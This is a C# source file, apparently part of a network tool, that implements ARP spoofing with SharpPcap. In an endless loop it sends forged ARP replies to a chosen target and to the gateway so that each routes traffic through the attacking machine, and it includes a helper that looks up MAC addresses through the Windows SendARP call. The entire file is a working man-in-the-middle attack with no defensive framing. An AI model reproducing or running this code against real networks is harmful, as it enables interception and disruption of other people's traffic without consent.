using PacketDotNet;
using SharpPcap;
using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Threading;

class Arp
{
    public void threadMethodeArpResponse(Host pTarget, Host pGateway, ICaptureDevice pCaptureDevice)
    {
        while (true)
        {
            try
            {
                //--Target
                sendArpResponse(pTarget.ipAddress, pGateway.ipAddress, pTarget.physicalAddress, pCaptureDevice);

                //--Gateway
                sendArpResponse(pGateway.ipAddress, pTarget.ipAddress, pGateway.physicalAddress, pCaptureDevice);

                Thread.Sleep(100);
            }
            catch (ThreadAbortException)
            {
                break;
            }
        }
    }

    private bool sendArpResponse(IPAddress pDestIPAddr, IPAddress pSourceIPAddr, PhysicalAddress pDestHwAddr, ICaptureDevice pDevice)
    {
        try
        {
            EthernetPacket ethernetPacket = new EthernetPacket(pDevice.MacAddress, pDestHwAddr, EthernetType.Arp);
            ArpPacket arpframe = new ArpPacket(ArpOperation.Response, pDestHwAddr, pDestIPAddr, pDevice.MacAddress, pSourceIPAddr);
            ethernetPacket.PayloadPacket = arpframe;

            pDevice.SendPacket(ethernetPacket);
            return true;
        }
        catch (Exception eX)
        {
            Console.WriteLine(eX.Message);
        }
        return false;
    }

    public PhysicalAddress getPhysicalAddress(IPAddress pIPAddress)
    {
        PhysicalAddress physicalAddress = null;

        try
        {
            byte[] ab = new byte[6];
            int len = ab.Length, r = SendARP((int)pIPAddress.Address, 0, ab, ref len);
            string tempHwAddress = BitConverter.ToString(ab, 0, 6);
            if (tempHwAddress != "00-00-00-00-00-00")
                physicalAddress = PhysicalAddress.Parse(tempHwAddress);
        }
        catch (Exception) { }

        return physicalAddress;
    }

    [DllImport("iphlpapi.dll", ExactSpelling = true)]
    public static extern int SendARP(int DestIP, int SrcIP, [Out] byte[] pMacAddr, ref int PhyAddrLen);
}